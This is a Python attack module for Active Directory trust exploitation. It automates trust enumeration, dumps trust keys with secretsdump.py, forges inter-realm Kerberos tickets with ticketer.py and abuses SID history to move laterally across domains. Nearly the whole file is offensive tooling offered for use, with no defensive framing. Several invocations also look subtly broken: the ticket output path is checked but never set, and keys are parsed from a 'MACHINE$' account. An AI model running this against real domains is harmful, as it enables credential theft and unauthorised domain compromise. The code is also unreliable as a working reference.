"""
Trust Relationship Attack Module

This module implements various Active Directory trust relationship attacks:
- Trust ticket attacks
- SID history abuse
- Foreign group membership abuse
- Trust key extraction
- Cross-forest attacks
"""

from typing import Dict, Optional, List, Tuple
from .attack_base import AttackBase
import subprocess
import json
import os
from impacket.dcerpc.v5 import transport, lsat, lsad
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from impacket.krb5.ccache import CCache

class TrustAttacks(AttackBase):
    def __init__(self):
        super().__init__()
        self.trust_info = None
        
    def enumerate_trusts(self, domain: str, dc_ip: str, username: str = None, password: str = None) -> bool:
        """
        Enumerate domain trust relationships
        
        Args:
            domain: Domain name
            dc_ip: Domain Controller IP
            username: Optional username for authentication
            password: Optional password for authentication
            
        Returns:
            bool indicating if enumeration was successful
        """
        try:
            self.log_status("Starting trust relationship enumeration...")
            
            # Use netexec for initial trust enumeration
            cmd = ['netexec', 'ldap', dc_ip, '--trusted-domains']
            if username and password:
                cmd.extend(['-u', username, '-p', password])
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "Found domain trusts" in result.stdout:
                self._parse_netexec_trusts(result.stdout)
                
            # Use secretsdump to get trust keys if we have credentials
            if username and password:
                self.log_status("Attempting to dump trust keys...")
                cmd = [
                    'secretsdump.py',
                    f'{domain}/{username}:{password}@{dc_ip}',
                    '-just-dc-user', 'MACHINE$'
                ]
                result = subprocess.run(cmd, capture_output=True, text=True)
                self._parse_trust_keys(result.stdout)
            
            if self.trust_info:
                self._display_trust_summary()
                return True
            return False
            
        except Exception as e:
            self.log_error(f"Trust enumeration failed: {str(e)}")
            return False
            
    def get_foreign_groups(self, domain: str, dc_ip: str) -> List[Dict]:
        """
        Find groups with foreign domain group membership
        
        Args:
            domain: Domain name
            dc_ip: Domain Controller IP
            
        Returns:
            List of groups with foreign membership
        """
        try:
            self.log_status("Checking for foreign group membership...")
            
            # Use BloodHound query format for foreign group membership
            query = (
                "MATCH p=(n:Group {domain:$domain})-[:MemberOf]->(m:Group) "
                "WHERE m.domain<>n.domain RETURN p"
            )
            
            # Execute query using SharpHound/BloodHound.py
            cmd = [
                'bloodhound.py',
                '-d', domain,
                '-dc', dc_ip,
                '--custom-query', query
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            return self._parse_foreign_groups(result.stdout)
            
        except Exception as e:
            self.log_error(f"Foreign group enumeration failed: {str(e)}")
            return []
            
    def exploit_trust_ticket(self, domain: str, target_domain: str, trust_key: str, 
                           username: str, sid: str = None) -> bool:
        """
        Create and use a trust ticket for lateral movement
        
        Args:
            domain: Current domain
            target_domain: Target trusted domain
            trust_key: Trust key (NTLM hash or AES key)
            username: Username to impersonate
            sid: Optional SID to include
            
        Returns:
            bool indicating success/failure
        """
        try:
            self.log_status(f"Attempting to create trust ticket for {target_domain}...")
            
            # Use ticketer.py to create the trust ticket
            output_file = f'/tmp/trust_{target_domain}.ccache'
            cmd = [
                'ticketer.py',
                '-nthash' if len(trust_key) == 32 else '-aesKey',
                trust_key,
                '-domain-sid', sid if sid else 'UNKNOWN',
                '-domain', domain,
                '-spn', f'krbtgt/{target_domain}',
                username
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if os.path.exists(output_file):
                self.log_success(f"Successfully created trust ticket for {username}")
                
                # Try to use the ticket
                os.environ['KRB5CCNAME'] = output_file
                return self._verify_ticket(target_domain)
            
            return False
            
        except Exception as e:
            self.log_error(f"Trust ticket creation failed: {str(e)}")
            return False
            
    def exploit_sid_history(self, domain: str, target_domain: str, 
                          username: str, password: str) -> bool:
        """
        Attempt SID history abuse across trust boundary
        
        Args:
            domain: Current domain
            target_domain: Target trusted domain
            username: Username with SID history
            password: Password for authentication
            
        Returns:
            bool indicating success/failure
        """
        try:
            self.log_status("Checking for SID history abuse potential...")
            
            # First get user's SID history
            cmd = [
                'netexec', 'ldap',
                f'{domain}/{username}:{password}',
                '--sid-history'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if "SID history found" in result.stdout:
                sids = self._parse_sid_history(result.stdout)
                
                for sid in sids:
                    if self._verify_sid_in_domain(sid, target_domain):
                        self.log_success(f"Found usable SID history: {sid}")
                        return self.exploit_trust_ticket(
                            domain, target_domain, 
                            self.trust_info['trust_key'],
                            username, sid
                        )
            
            return False
            
        except Exception as e:
            self.log_error(f"SID history abuse failed: {str(e)}")
            return False
            
    def _parse_netexec_trusts(self, output: str):
        """Parse netexec trust enumeration output"""
        if not self.trust_info:
            self.trust_info = {
                'trusts': [],
                'trust_key': None
            }
            
        for line in output.splitlines():
            if "Found domain trust" in line:
                trust = {
                    'domain': line.split()[3],
                    'direction': line.split()[5],
                    'type': line.split()[7] if len(line.split()) > 7 else 'Unknown'
                }
                self.trust_info['trusts'].append(trust)
                
    def _parse_trust_keys(self, output: str):
        """Parse secretsdump trust key output"""
        for line in output.splitlines():
            if "MACHINE$" in line and "aes256-cts-hmac-sha1" in line:
                self.trust_info['trust_key'] = line.split(':')[2]
                break
                
    def _display_trust_summary(self):
        """Display summary of discovered trust relationships"""
        print("\n=== Trust Relationship Summary ===")
        
        for trust in self.trust_info['trusts']:
            print(f"\nTrusted Domain: {trust['domain']}")
            print(f"Trust Direction: {trust['direction']}")
            print(f"Trust Type: {trust['type']}")
            
        if self.trust_info.get('trust_key'):
            print("\n[!] Trust key material available")
            
    def _parse_foreign_groups(self, output: str) -> List[Dict]:
        """Parse BloodHound foreign group output"""
        groups = []
        try:
            data = json.loads(output)
            for result in data:
                if 'nodes' in result:
                    for node in result['nodes']:
                        if node['type'] == 'Group':
                            groups.append({
                                'name': node['name'],
                                'domain': node['domain'],
                                'foreign_groups': [
                                    edge['target'] 
                                    for edge in result['edges'] 
                                    if edge['source'] == node['id']
                                ]
                            })
        except:
            pass
        return groups
        
    def _verify_ticket(self, target_domain: str) -> bool:
        """Verify if trust ticket is usable"""
        try:
            cmd = ['klist']
            result = subprocess.run(cmd, capture_output=True, text=True)
            return target_domain.lower() in result.stdout.lower()
        except:
            return False
            
    def _verify_sid_in_domain(self, sid: str, domain: str) -> bool:
        """Check if SID belongs to target domain"""
        try:
            cmd = ['lookupsid.py', f'{domain}/{sid}']
            result = subprocess.run(cmd, capture_output=True, text=True)
            return domain.lower() in result.stdout.lower()
        except:
            return False 